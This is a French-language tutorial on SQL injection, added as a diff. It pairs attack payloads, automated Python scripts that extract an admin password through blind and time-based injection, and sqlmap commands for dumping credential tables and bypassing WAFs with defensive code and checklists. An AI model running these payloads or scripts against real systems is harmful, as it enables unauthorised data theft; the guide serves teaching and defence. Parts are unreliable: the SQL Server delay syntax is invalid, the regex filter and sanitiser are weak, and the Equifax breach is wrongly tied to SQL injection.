@@ -1,0 +1,921 @@
+---
+title: "SQL Injection - Guide complet d'exploitation et de protection"
+category: "web-security"
+description: "Guide expert sur SQL Injection : types d'injection (Union-based, Error-based, Blind, Time-based), techniques d'exploitation avancées, méthodes de protection (prepared statements, ORM, WAF), outils de test (SQLMap), exemples de code complets et cas d'usage réels."
+coverImage: "/guides/sql-injection.jpg"
+date: "2024-03-14"
+difficulty: "avancé"
+readingTime: "35 min"
+prerequisites: ["Bases SQL", "Développement web", "Concepts de sécurité"]
+lastUpdated: "2024-12-19"
+---
+
+# SQL Injection - Guide complet d'exploitation et de protection
+
+SQL Injection est l'une des vulnérabilités web les plus dangereuses et les plus répandues. Classée dans l'OWASP Top 10 depuis sa création, elle permet à un attaquant d'exécuter des commandes SQL arbitraires sur une base de données, compromettant potentiellement l'intégrité, la confidentialité et la disponibilité des données.
+
+## Introduction
+
+SQL Injection se produit lorsque des données non fiables sont directement concaténées dans des requêtes SQL sans validation ni échappement approprié. Cette vulnérabilité peut permettre à un attaquant de :
+
+- Lire des données sensibles (mots de passe, informations personnelles)
+- Modifier ou supprimer des données
+- Contourner l'authentification
+- Exécuter des commandes système (dans certains cas)
+- Compromettre l'intégrité de la base de données
+
+## Concepts fondamentaux
+
+### Principe de base
+
+Une injection SQL se produit lorsque l'application construit dynamiquement des requêtes SQL en concaténant des entrées utilisateur sans les valider ou les échapper :
+
+```javascript
+// Vulnérable
+const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+```
+
+Si un utilisateur entre `admin'--` comme username, la requête devient :
+
+```sql
+SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
+```
+
+Le `--` commente le reste de la requête, permettant de contourner la vérification du mot de passe.
+
+### Pourquoi c'est dangereux
+
+1. **Accès non autorisé** : Contournement de l'authentification
+2. **Exfiltration de données** : Lecture de toutes les données de la base
+3. **Modification de données** : Altération ou suppression de données
+4. **Escalade de privilèges** : Accès à des fonctionnalités administrateur
+5. **Compromission complète** : Dans certains cas, exécution de commandes système
+
+## Types d'injection SQL
+
+### 1. Union-based SQL Injection
+
+Cette technique utilise la clause `UNION` pour combiner les résultats de plusieurs requêtes SELECT.
+
+#### Mécanisme
+
+```javascript
+// Vulnérable
+app.get('/api/products', (req, res) => {
+    const query = `SELECT id, name, price FROM products WHERE category = '${req.query.category}'`;
+    db.query(query, (err, results) => {
+        res.json(results);
+    });
+});
+```
+
+#### Exploitation
+
+```sql
+-- Découvrir le nombre de colonnes
+' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL, NULL, NULL--
+
+-- Une fois le nombre de colonnes connu (3 dans cet exemple)
+' UNION SELECT username, password, NULL FROM users--
+
+-- Version complète de l'attaque
+category=' UNION SELECT username, password, email FROM users--
+```
+
+#### Exemple complet d'exploitation
+
+```javascript
+// Requête originale
+SELECT id, name, price FROM products WHERE category = 'electronics'
+
+// Injection
+category = "electronics' UNION SELECT username, password, email FROM users--"
+
+// Requête résultante
+SELECT id, name, price FROM products WHERE category = 'electronics' 
+UNION SELECT username, password, email FROM users--'
+```
+
+#### Protection
+
+```javascript
+// Utilisation de prepared statements
+app.get('/api/products', (req, res) => {
+    const query = 'SELECT id, name, price FROM products WHERE category = ?';
+    db.query(query, [req.query.category], (err, results) => {
+        res.json(results);
+    });
+});
+
+// Validation stricte
+const { z } = require('zod');
+
+const categorySchema = z.enum(['electronics', 'clothing', 'books', 'toys']);
+
+app.get('/api/products', (req, res) => {
+    try {
+        const category = categorySchema.parse(req.query.category);
+        const query = 'SELECT id, name, price FROM products WHERE category = ?';
+        db.query(query, [category], (err, results) => {
+            res.json(results);
+        });
+    } catch (error) {
+        res.status(400).json({ error: 'Invalid category' });
+    }
+});
+```
+
+### 2. Error-based SQL Injection
+
+Cette technique exploite les messages d'erreur de la base de données pour extraire des informations.
+
+#### Mécanisme
+
+```javascript
+// Vulnérable
+app.get('/api/user/:id', (req, res) => {
+    const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
+    db.query(query, (err, results) => {
+        if (err) {
+            res.status(500).json({ error: err.message });
+        } else {
+            res.json(results);
+        }
+    });
+});
+```
+
+#### Exploitation
+
+```sql
+-- Extraire le nom de la base de données
+1 AND (SELECT * FROM (SELECT COUNT(*), CONCAT(database(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--
+
+-- Extraire le nom d'une table
+1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e))--
+
+-- Extraire les colonnes
+1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 0x7e))--
+
+-- Extraire les données
+1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT username FROM users LIMIT 0,1), 0x7e))--
+```
+
+#### Fonctions d'extraction par SGBD
+
+**MySQL :**
+```sql
+-- EXTRACTVALUE
+EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))
+
+-- UPDATEXML
+UPDATEXML(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)
+
+-- FLOOR avec RAND
+SELECT * FROM users WHERE id=1 AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)
+```
+
+**PostgreSQL :**
+```sql
+-- CAST avec erreur
+1 AND CAST((SELECT version()) AS int)--
+
+-- Erreur de type
+1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+```
+
+**SQL Server :**
+```sql
+-- CONVERT avec erreur
+1 AND CONVERT(int, (SELECT @@version))--
+
+-- Erreur de conversion
+1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--
+```
+
+#### Protection
+
+```javascript
+// Ne jamais exposer les messages d'erreur détaillés en production
+app.get('/api/user/:id', (req, res) => {
+    const id = parseInt(req.params.id);
+    
+    if (isNaN(id)) {
+        return res.status(400).json({ error: 'Invalid user ID' });
+    }
+    
+    const query = 'SELECT * FROM users WHERE id = ?';
+    db.query(query, [id], (err, results) => {
+        if (err) {
+            logger.error('Database error', { error: err, userId: id });
+            res.status(500).json({ error: 'An error occurred' });
+        } else {
+            res.json(results);
+        }
+    });
+});
+```
+
+### 3. Blind SQL Injection (Boolean-based)
+
+Cette technique exploite les différences de comportement de l'application selon que la condition SQL est vraie ou fausse.
+
+#### Mécanisme
+
+```javascript
+// Vulnérable
+app.get('/api/product/:id', (req, res) => {
+    const query = `SELECT * FROM products WHERE id = ${req.params.id}`;
+    db.query(query, (err, results) => {
+        if (results.length > 0) {
+            res.json(results[0]);
+        } else {
+            res.status(404).json({ error: 'Product not found' });
+        }
+    });
+});
+```
+
+#### Exploitation
+
+```sql
+-- Tester si la première lettre du mot de passe de l'admin est 'a'
+1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='a'--
+
+-- Tester si la version de MySQL commence par '5'
+1 AND SUBSTRING(@@version, 1, 1)='5'--
+
+-- Extraire caractère par caractère
+1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1))>64--
+1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1))<91--
+```
+
+#### Script d'exploitation automatisé
+
+```python
+import requests
+import string
+
+def blind_sql_injection(url, param, condition):
+    true_response = requests.get(url, params={param: f"1 AND 1=1--"}).text
+    false_response = requests.get(url, params={param: f"1 AND 1=2--"}).text
+    
+    extracted = ""
+    position = 1
+    
+    while True:
+        found = False
+        for char in string.printable:
+            payload = f"1 AND ASCII(SUBSTRING(({condition}), {position}, 1))={ord(char)}--"
+            response = requests.get(url, params={param: payload}).text
+            
+            if response == true_response:
+                extracted += char
+                found = True
+                position += 1
+                print(f"Extracted: {extracted}")
+                break
+        
+        if not found:
+            break
+    
+    return extracted
+
+# Utilisation
+password = blind_sql_injection(
+    "http://vulnerable.com/api/user",
+    "id",
+    "SELECT password FROM users WHERE username='admin'"
+)
+```
+
+#### Protection
+
+```javascript
+// Validation stricte des paramètres
+const { z } = require('zod');
+
+const idSchema = z.number().int().positive();
+
+app.get('/api/product/:id', (req, res) => {
+    try {
+        const id = idSchema.parse(parseInt(req.params.id));
+        const query = 'SELECT * FROM products WHERE id = ?';
+        db.query(query, [id], (err, results) => {
+            if (results.length > 0) {
+                res.json(results[0]);
+            } else {
+                res.status(404).json({ error: 'Product not found' });
+            }
+        });
+    } catch (error) {
+        res.status(400).json({ error: 'Invalid product ID' });
+    }
+});
+```
+
+### 4. Time-based Blind SQL Injection
+
+Cette technique utilise des fonctions qui introduisent des délais pour extraire des informations.
+
+#### Mécanisme
+
+```sql
+-- MySQL
+1 AND IF(SUBSTRING(@@version, 1, 1)='5', SLEEP(5), 0)--
+
+-- PostgreSQL
+1 AND (SELECT CASE WHEN (SUBSTRING(version(), 1, 1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+-- SQL Server
+1 AND IF(SUBSTRING(@@version, 1, 1)='M', WAITFOR DELAY '00:00:05', 0)--
+```
+
+#### Exploitation
+
+```python
+import requests
+import time
+import string
+
+def time_based_blind_sql_injection(url, param, condition):
+    extracted = ""
+    position = 1
+    
+    while True:
+        found = False
+        for char in string.printable:
+            payload = f"1 AND IF(ASCII(SUBSTRING(({condition}), {position}, 1))={ord(char)}, SLEEP(5), 0)--"
+            
+            start = time.time()
+            requests.get(url, params={param: payload})
+            elapsed = time.time() - start
+            
+            if elapsed >= 4.5:
+                extracted += char
+                found = True
+                position += 1
+                print(f"Extracted: {extracted}")
+                break
+        
+        if not found:
+            break
+    
+    return extracted
+```
+
+#### Protection
+
+```javascript
+// Timeout strict sur les requêtes
+const mysql = require('mysql2/promise');
+
+const pool = mysql.createPool({
+    host: 'localhost',
+    user: 'user',
+    password: 'password',
+    database: 'mydb',
+    connectionLimit: 10,
+    connectTimeout: 5000,
+    acquireTimeout: 5000
+});
+
+app.get('/api/product/:id', async (req, res) => {
+    const id = parseInt(req.params.id);
+    
+    if (isNaN(id)) {
+        return res.status(400).json({ error: 'Invalid ID' });
+    }
+    
+    try {
+        const [results] = await pool.execute(
+            'SELECT * FROM products WHERE id = ?',
+            [id],
+            { timeout: 3000 }
+        );
+        
+        if (results.length > 0) {
+            res.json(results[0]);
+        } else {
+            res.status(404).json({ error: 'Not found' });
+        }
+    } catch (error) {
+        if (error.code === 'PROTOCOL_SEQUENCE_TIMEOUT') {
+            res.status(408).json({ error: 'Request timeout' });
+        } else {
+            res.status(500).json({ error: 'Server error' });
+        }
+    }
+});
+```
+
+### 5. Second-order SQL Injection
+
+Cette technique exploite des données qui sont stockées puis utilisées plus tard dans une requête SQL.
+
+#### Mécanisme
+
+```javascript
+// Vulnérable : Inscription
+app.post('/api/register', (req, res) => {
+    const username = req.body.username;
+    const query = `INSERT INTO users (username) VALUES ('${username}')`;
+    db.query(query);
+    res.json({ success: true });
+});
+
+// Plus tard : Recherche
+app.get('/api/search', (req, res) => {
+    const searchTerm = req.query.q;
+    const query = `SELECT * FROM users WHERE username LIKE '%${searchTerm}%'`;
+    db.query(query, (err, results) => {
+        res.json(results);
+    });
+});
+```
+
+#### Exploitation
+
+1. Inscription avec un username malveillant : `admin'--`
+2. Le username est stocké tel quel dans la base
+3. Lors de la recherche, la requête devient : `SELECT * FROM users WHERE username LIKE '%admin'--%'`
+
+#### Protection
+
+```javascript
+// Toujours utiliser des prepared statements, même pour les données "sûres"
+app.post('/api/register', (req, res) => {
+    const username = req.body.username;
+    const query = 'INSERT INTO users (username) VALUES (?)';
+    db.query(query, [username], (err, results) => {
+        if (err) {
+            res.status(500).json({ error: 'Registration failed' });
+        } else {
+            res.json({ success: true });
+        }
+    });
+});
+
+app.get('/api/search', (req, res) => {
+    const searchTerm = req.query.q;
+    const query = 'SELECT * FROM users WHERE username LIKE ?';
+    db.query(query, [`%${searchTerm}%`], (err, results) => {
+        res.json(results);
+    });
+});
+```
+
+## Techniques de protection
+
+### 1. Prepared Statements (Requêtes paramétrées)
+
+Les prepared statements sont la méthode de protection la plus efficace contre les injections SQL.
+
+#### MySQL (Node.js)
+
+```javascript
+const mysql = require('mysql2/promise');
+
+const pool = mysql.createPool({
+    host: 'localhost',
+    user: 'user',
+    password: 'password',
+    database: 'mydb'
+});
+
+// Prepared statement
+async function getUser(username) {
+    const [results] = await pool.execute(
+        'SELECT * FROM users WHERE username = ?',
+        [username]
+    );
+    return results[0];
+}
+
+// Avec plusieurs paramètres
+async function createUser(username, email, password) {
+    const hashedPassword = await bcrypt.hash(password, 10);
+    const [results] = await pool.execute(
+        'INSERT INTO users (username, email, password) VALUES (?, ?, ?)',
+        [username, email, hashedPassword]
+    );
+    return results.insertId;
+}
+```
+
+#### PostgreSQL (Node.js)
+
+```javascript
+const { Pool } = require('pg');
+
+const pool = new Pool({
+    host: 'localhost',
+    user: 'user',
+    password: 'password',
+    database: 'mydb'
+});
+
+async function getUser(username) {
+    const result = await pool.query(
+        'SELECT * FROM users WHERE username = $1',
+        [username]
+    );
+    return result.rows[0];
+}
+```
+
+#### SQL Server (Node.js)
+
+```javascript
+const sql = require('mssql');
+
+const pool = await sql.connect({
+    server: 'localhost',
+    user: 'user',
+    password: 'password',
+    database: 'mydb'
+});
+
+async function getUser(username) {
+    const result = await pool.request()
+        .input('username', sql.NVarChar, username)
+        .query('SELECT * FROM users WHERE username = @username');
+    return result.recordset[0];
+}
+```
+
+### 2. ORM (Object-Relational Mapping)
+
+Les ORM gèrent automatiquement la protection contre les injections SQL.
+
+#### Sequelize (Node.js)
+
+```javascript
+const { Sequelize, DataTypes } = require('sequelize');
+
+const sequelize = new Sequelize('database', 'user', 'password', {
+    host: 'localhost',
+    dialect: 'mysql'
+});
+
+const User = sequelize.define('User', {
+    username: {
+        type: DataTypes.STRING,
+        allowNull: false
+    },
+    email: {
+        type: DataTypes.STRING,
+        allowNull: false
+    }
+});
+
+// Recherche sécurisée
+const user = await User.findOne({
+    where: {
+        username: req.body.username
+    }
+});
+
+// Recherche avec LIKE
+const users = await User.findAll({
+    where: {
+        username: {
+            [Op.like]: `%${req.query.search}%`
+        }
+    }
+});
+```
+
+#### TypeORM (Node.js/TypeScript)
+
+```typescript
+import { Entity, PrimaryGeneratedColumn, Column } from 'typeorm';
+
+@Entity()
+export class User {
+    @PrimaryGeneratedColumn()
+    id: number;
+    
+    @Column()
+    username: string;
+    
+    @Column()
+    email: string;
+}
+
+// Recherche sécurisée
+const userRepository = connection.getRepository(User);
+const user = await userRepository.findOne({
+    where: { username: req.body.username }
+});
+
+// Requête personnalisée sécurisée
+const users = await userRepository
+    .createQueryBuilder('user')
+    .where('user.username = :username', { username: req.body.username })
+    .getMany();
+```
+
+#### Prisma (Node.js)
+
+```javascript
+const { PrismaClient } = require('@prisma/client');
+const prisma = new PrismaClient();
+
+// Recherche sécurisée
+const user = await prisma.user.findFirst({
+    where: {
+        username: req.body.username
+    }
+});
+
+// Recherche avec LIKE
+const users = await prisma.user.findMany({
+    where: {
+        username: {
+            contains: req.query.search
+        }
+    }
+});
+```
+
+### 3. Validation et sanitization
+
+```javascript
+const { z } = require('zod');
+const validator = require('validator');
+
+// Validation stricte
+const usernameSchema = z.string()
+    .min(3)
+    .max(50)
+    .regex(/^[a-zA-Z0-9_]+$/)
+    .refine(val => !val.includes("'") && !val.includes('"') && !val.includes(';'), {
+        message: 'Invalid characters'
+    });
+
+// Sanitization
+function sanitizeInput(input) {
+    if (typeof input !== 'string') {
+        return input;
+    }
+    
+    return input
+        .replace(/'/g, "''")
+        .replace(/;/g, '')
+        .replace(/--/g, '')
+        .replace(/\/\*/g, '')
+        .replace(/\*\//g, '')
+        .trim();
+}
+
+// Utilisation
+app.post('/api/user', (req, res) => {
+    try {
+        const username = usernameSchema.parse(req.body.username);
+const query = 'SELECT * FROM users WHERE username = ?';
+        db.query(query, [username], (err, results) => {
+            res.json(results);
+        });
+    } catch (error) {
+        res.status(400).json({ error: 'Invalid input' });
+    }
+});
+```
+
+### 4. Principe du moindre privilège
+
+```sql
+-- Créer un utilisateur avec des privilèges limités
+CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
+
+-- Accorder uniquement les privilèges nécessaires
+GRANT SELECT, INSERT, UPDATE ON mydb.users TO 'app_user'@'localhost';
+GRANT SELECT ON mydb.products TO 'app_user'@'localhost';
+
+-- Ne jamais accorder DROP, ALTER, CREATE, etc.
+-- Ne jamais utiliser le compte root pour l'application
+```
+
+### 5. WAF (Web Application Firewall)
+
+```javascript
+const express = require('express');
+const helmet = require('helmet');
+
+const app = express();
+
+// Filtre SQL Injection basique
+app.use((req, res, next) => {
+    const sqlPatterns = [
+        /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE|UNION)\b)/i,
+        /(--|;|\/\*|\*\/|xp_|sp_)/,
+        /(\bOR\b.*=.*)/i,
+        /(\bAND\b.*=.*)/i
+    ];
+    
+    const checkString = JSON.stringify(req.body) + JSON.stringify(req.query) + JSON.stringify(req.params);
+    
+    for (const pattern of sqlPatterns) {
+        if (pattern.test(checkString)) {
+            logger.warn('Potential SQL injection attempt', {
+                ip: req.ip,
+                path: req.path,
+                pattern: pattern.toString()
+            });
+            return res.status(400).json({ error: 'Invalid request' });
+        }
+    }
+    
+    next();
+});
+```
+
+## Outils de test et détection
+
+### SQLMap
+
+SQLMap est l'outil le plus puissant pour la détection et l'exploitation automatique des injections SQL.
+
+#### Installation
+
+```bash
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+python sqlmap.py --help
+```
+
+#### Utilisation de base
+
+```bash
+# Test basique
+python sqlmap.py -u "http://target.com/page?id=1"
+
+# Avec authentification
+python sqlmap.py -u "http://target.com/page?id=1" --cookie="session=abc123"
+
+# Avec POST
+python sqlmap.py -u "http://target.com/login" --data="username=admin&password=test" --method=POST
+
+# Extraire les bases de données
+python sqlmap.py -u "http://target.com/page?id=1" --dbs
+
+# Extraire les tables
+python sqlmap.py -u "http://target.com/page?id=1" -D database_name --tables
+
+# Extraire les colonnes
+python sqlmap.py -u "http://target.com/page?id=1" -D database_name -T users --columns
+
+# Extraire les données
+python sqlmap.py -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump
+```
+
+#### Options avancées
+
+```bash
+# Utiliser un proxy
+python sqlmap.py -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
+
+# Techniques spécifiques
+python sqlmap.py -u "http://target.com/page?id=1" --technique=U
+
+# Niveau de risque et profondeur
+python sqlmap.py -u "http://target.com/page?id=1" --risk=3 --level=5
+
+# Threads multiples
+python sqlmap.py -u "http://target.com/page?id=1" --threads=10
+
+# Bypass WAF
+python sqlmap.py -u "http://target.com/page?id=1" --tamper=space2comment
+```
+
+### Burp Suite
+
+Burp Suite permet des tests manuels et automatiques.
+
+1. Intercepter la requête avec Burp Proxy
+2. Envoyer à SQLi Scanner
+3. Analyser les résultats
+4. Tester manuellement avec Repeater
+
+### OWASP ZAP
+
+```bash
+# Scan automatique
+zap-cli quick-scan http://target.com
+
+# Scan avec authentification
+zap-cli quick-scan --login-url http://target.com/login \
+    --login-request-data "username=admin&password=test" \
+    http://target.com
+```
+
+### Tests manuels
+
+```javascript
+// Script de test Node.js
+const axios = require('axios');
+
+async function testSQLInjection(url, param) {
+    const payloads = [
+        "' OR '1'='1",
+        "' OR '1'='1'--",
+        "' OR '1'='1'/*",
+        "admin'--",
+        "admin'/*",
+        "' UNION SELECT NULL--",
+        "1' AND '1'='1",
+        "1' AND '1'='2"
+    ];
+    
+    for (const payload of payloads) {
+        try {
+            const response = await axios.get(url, {
+                params: { [param]: payload }
+            });
+            
+            if (response.data.includes('error') || 
+                response.data.includes('SQL') ||
+                response.data.includes('syntax')) {
+                console.log(`Potential SQL injection: ${payload}`);
+            }
+        } catch (error) {
+            if (error.response && error.response.status === 500) {
+                console.log(`Potential SQL injection (500 error): ${payload}`);
+            }
+        }
+    }
+}
+```
+
+## Cas d'usage réels
+
+### Equifax (2017)
+
+En 2017, Equifax a subi une faille massive due à une injection SQL combinée à une vulnérabilité dans Apache Struts. Les données de 147 millions de personnes ont été exposées, incluant des numéros de sécurité sociale, dates de naissance et adresses.
+
+**Leçons apprises :**
+- Importance de la mise à jour des dépendances
+- Nécessité de tests de sécurité réguliers
+- Impact des failles de sécurité sur la réputation
+
+### Sony Pictures (2014)
+
+Sony Pictures a été victime d'une attaque incluant des injections SQL, exposant des données d'employés, des emails internes et des scripts de films.
+
+### Heartland Payment Systems (2008)
+
+Une injection SQL a permis l'installation de malware qui a intercepté plus de 100 millions de transactions par carte de crédit.
+
+## Bonnes pratiques
+
+### Checklist de sécurité
+
+- [ ] Utiliser exclusivement des prepared statements pour toutes les requêtes SQL
+- [ ] Valider et sanitizer toutes les entrées utilisateur
+- [ ] Utiliser des ORM lorsque possible
+- [ ] Implémenter le principe du moindre privilège pour les comptes de base de données
+- [ ] Ne jamais exposer les messages d'erreur SQL en production
+- [ ] Logger toutes les tentatives suspectes
+- [ ] Effectuer des audits de sécurité réguliers
+- [ ] Maintenir les SGBD à jour
+- [ ] Utiliser un WAF en complément (pas en remplacement)
+- [ ] Former les développeurs aux bonnes pratiques
+- [ ] Effectuer des tests de pénétration réguliers
+- [ ] Implémenter la détection d'anomalies
+- [ ] Chiffrer les données sensibles dans la base
+- [ ] Implémenter des timeouts sur les requêtes
+- [ ] Limiter les privilèges des comptes applicatifs
+
+### Code review checklist
+
+- [ ] Vérifier l'absence de concaténation de strings dans les requêtes SQL
+- [ ] S'assurer que tous les paramètres utilisent des prepared statements
+- [ ] Vérifier la validation des entrées
+- [ ] Examiner les requêtes dynamiques complexes
+- [ ] Vérifier les permissions de base de données
+- [ ] Examiner la gestion des erreurs
+
+## Conclusion
+
+SQL Injection reste une menace majeure malgré sa connaissance depuis des décennies. La protection efficace nécessite :
+
+1. **Utilisation systématique de prepared statements** : La méthode la plus importante
+2. **Validation stricte des entrées** : Première ligne de défense
+3. **Principe du moindre privilège** : Limiter les dégâts en cas de compromission
+4. **Monitoring et détection** : Identifier les tentatives d'injection
+5. **Formation continue** : Maintenir les compétences de l'équipe à jour
+
+Une approche en couches combinant ces techniques offre la meilleure protection contre les injections SQL.
+
+## Références techniques
+
+- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
+- [SQLMap Documentation](https://sqlmap.org/)
+- [PortSwigger Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
+- [MySQL Prepared Statements](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html)
+- [PostgreSQL Prepared Statements](https://www.postgresql.org/docs/current/sql-prepare.html)
